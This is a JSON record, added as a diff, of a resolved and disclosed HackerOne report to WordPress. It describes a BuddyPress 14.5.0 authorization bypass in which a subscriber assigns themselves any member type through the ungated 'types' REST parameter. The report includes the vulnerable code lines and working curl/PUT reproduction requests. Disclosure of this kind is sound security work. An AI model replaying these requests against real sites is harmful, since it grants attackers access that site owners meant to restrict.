@@ -1,0 +1,132 @@
+{
+  "id": 3892948,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODkyOTQ4",
+  "url": "https://hackerone.com/reports/3892948",
+  "title": "Broken access control: any member can self-assign arbitrary BuddyPress member types via the ungated \"types\" REST parameter, bypassing the bp_moderate ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-27T09:49:32.781Z",
+  "submitted_at": "2026-07-27T09:49:33.341Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jakubk",
+    "url": "/jakubk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/stj402qv8vdsgjxvp8f1b7y5nimu/07cd666fba81a5fa22acb6ca51c9388fb3fc6282d31bb7100e43ac54f865f93e"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/07cd666fba81a5fa22acb6ca51c9388fb3fc6282d31bb7100e43ac54f865f93e",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd08e782c04618ccf4078fde091552e41c32901ba3cb30186ad6a7baad6cd3b2"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-22T11:33:05.851Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-23T11:33:03.184Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The BuddyPress Members REST endpoint (PUT /wp-json/buddypress/v1/members/{id}) is intended to forbid a non-moderator from changing their own member type: update_item_permissions_check() blocks the edit unless the caller has the bp_moderate capability.\n\nThat gate only inspects the \"member_type\" request parameter. However, prepare_item_for_database() — which runs AFTER the permission check has already passed — also honors a legacy alias parameter named \"types\": it reads \"types\", converts it into \"member_type\", and writes it via bp_set_member_type().\n\nAs a result, any authenticated low-privilege user (e.g. a subscriber) can self-assign ANY registered member type by sending \"types=\" instead of \"member_type=\", completely bypassing the bp_moderate authorization check the code explicitly enforces for this operation.\n\nAffected file: bp-members/classes/class-bp-rest-members-endpoint.php (BuddyPress 14.5.0)\n\nPermission gate (only checks \"member_type\"):\n  line 352: $member_type_edit = ! empty( $request->get_param( 'member_type' ) );\n  line 370: if ( $member_type_edit && ! bp_current_user_can( 'bp_moderate' ) ) { $retval = $error; }\n\nUngated alias written after the check passes:\n  line 796: $types = $request->get_param( 'types' );\n  line 798: $request->set_param( 'member_type', bp_rest_sanitize_member_types( $types ) );\n  line 807: bp_set_member_type( $prepared_user->ID, $request->get_param( 'member_type' ), $append );\n\nSetup:\n1. A WordPress site with BuddyPress 14.5.0, Members component + REST API enabled.\n2. At least one registered member type. If the test site has none, register one, e.g. an mu-plugin:\n     add_action('bp_register_member_types', function(){\n         bp_register_member_type('vip', array('labels'=>array('name'=>'VIP')));\n     });\n3. A plain subscriber account (here: user \"mallory\", id 2), authenticated to the REST API\n   (Application Password or cookie + X-WP-Nonce). No moderator/admin capability.\n\nControl — confirm the intended gate works (direct member_type is blocked):\n4. Send:\n     PUT /wp-json/buddypress/v1/members/2\n     Content-Type: application/x-www-form-urlencoded\n     Body: member_type=vip\n   Response: HTTP 403\n     {\"code\":\"bp_rest_authorization_required\",\"message\":\"Sorry, you are not allowed to perform this action.\"}\n\nExploit — the alias bypasses the gate:\n5. Send the same request using the \"types\" alias instead:\n     PUT /wp-json/buddypress/v1/members/2\n     Content-Type: application/x-www-form-urlencoded\n     Body: types=vip\n   Response: HTTP 200, body contains  \"member_types\":[\"vip\"]\n\nServer-side confirmation (fresh process, not the response echo):\n6. wp eval 'var_export(bp_get_member_type(2, false));'  ->  array( 0 => 'vip', )\n   The WordPress role is unchanged (subscriber); this is a member-type escalation.\n\ncurl equivalents (Application Password auth):\n  # blocked\n  curl -u mallory:APPPASS -X PUT https://SITE/wp-json/buddypress/v1/members/2 --data \"member_type=vip\"\n  # bypass\n  curl -u mallory:APPPASS -X PUT https://SITE/wp-json/buddypress/v1/members/2 --data \"types=vip\"\n\n## Impact\n\nThe code deliberately restricts member-type self-assignment to users holding bp_moderate. That control is fully bypassed by any single authenticated low-privilege account acting on its own profile. Member types in BuddyPress and third-party plugins commonly gate member-directory filtering, profile/content visibility, and access tiers (e.g. \"vip\", \"staff\", \"verified\"). An attacker can therefore grant themselves any registered member type and gain whatever access that type confers on a given installation — an authorization-bypass of an explicit privilege check, with a universal precondition (one low-privilege user).",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-11-22T11:33:03.440Z",
+  "allow_singular_disclosure_after": -5185.717685464,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "jakubk",
+    "2026",
+    "prox674",
+    "hexa34",
+    "ya3raj",
+    "cukindaix"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.4,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2751,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "BuddyPress Core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
